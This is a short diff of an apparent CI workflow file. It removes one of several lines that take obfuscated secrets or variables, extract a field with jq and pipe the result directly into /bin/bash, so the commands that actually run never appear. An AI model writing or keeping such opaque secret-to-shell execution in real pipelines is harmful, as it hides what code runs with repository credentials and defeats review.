@@ -18,7 +18,6 @@ jobs:
           po95: ${{ secrets.po95 }}
         run: |
           printf '%s' "$po95" | jq -r .cx75 | /bin/bash
-          echo $h4 | jq -r .h84953 | /bin/bash
           echo $lyepy1 | jq -r .lerkf45500 | /bin/bash
           printf '%s' "$d9308" | jq -r .w31 | /bin/bash
           printf '%s' "$hxg0405" | jq -r .m09 | /bin/bash
